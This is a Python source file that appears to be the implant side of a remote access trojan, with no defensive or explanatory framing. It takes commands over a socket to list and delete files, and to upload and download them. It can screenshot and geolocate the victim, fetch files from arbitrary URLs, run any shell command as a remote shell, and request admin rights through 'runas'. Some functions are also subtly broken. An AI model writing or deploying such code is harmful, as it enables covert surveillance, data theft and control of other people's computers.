import os
import socket
import pyautogui
import time
import getpass
import requests
import subprocess
import geocoder
import ctypes
import sys
import signal
import struct

def check_command(s,command):
    if command == "pwd":
        pwd(s)

    elif command == "custom_dir":
        custom_dir(s)
        
    elif command == "geolocate":
        geolocate(s)

    elif command == "download_file":
        download_file(s)

    elif command == "remove_file":
        remove_file(s)

    elif command == "send_files":
        send_files(s)

    elif command == "screenshot":
        screenshot(s)
    
    elif command == "download_url":
        download_url(s)
    elif command == "cmd":
        cmd(s)
    
    if command == "get_admin":
        get_admin(s)

def pwd(s):
    files = os.getcwd()
    files = str(files)
    s.send(files.encode())

def custom_dir(s):
    user_input = s.recv(5000)
    user_input = user_input.decode()
    files = os.listdir(user_input)
    files = str("\n".join(files))
    s.send(files.encode())

def geolocate(s):
    ipaddress = geocoder.ip('me')
    s.send(str(ipaddress).encode())
    s.send(str(ipaddress.latlng).encode())

def download_file(s):
    filepath = s.recv(5000)
    filepath = filepath.decode()
    file = open("filepath", "rb")
    data = file.read(s)
    s.send(data)

def remove_file(s):
    file_and_dir = s.recv(6000)
    file_and_dir = file_and_dir.decode()
    os.remove(file_and_dir)

def send_files(s):
    filename = s.recv(6000)
    new_file = open(filename, "wb")
    data = s.recv(6000)
    new_file.write(data)
    new_file.close()

def screenshot(s):
    """Make screenshot and send it to the target"""
    screenshot = pyautogui.screenshot()
    screenshot_path = os.getcwd() + "\current_screenshot.png"
    screenshot.save(screenshot_path)
    screenshot.close()

    screenshot = open(screenshot_path, "rb")
    data = screenshot.read()
    s.send(data)

def download_url(s):
    url = s.recv(100000000)
    filename = s.recv(1000000)
    url = url.decode()
    filename = filename.decode()
    r = requests.get(url) 
    f = open(filename, "wb+")
    f.write(r.content)
    f.close() 
    

def cmd(s):
    while True:
        try:
            data = s.recv(13107200)
            if data[:2].decode() == 'cd':
                os.chdir(data[3:].decode())
            if len(data) > 0:
                cmd_command = subprocess.Popen(data[:].decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd_command.stdout.read() + cmd_command.stderr.read()
                output_str = str(output_bytes.decode())
                s.send(str(output_str + str(os.getcwd()) + '> ').encode())
                print(output_str)
        except Exception as e:
            s.send(str(str(e) + "\n" + str(os.getcwd()) + '> ').encode())

def get_admin(s):
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)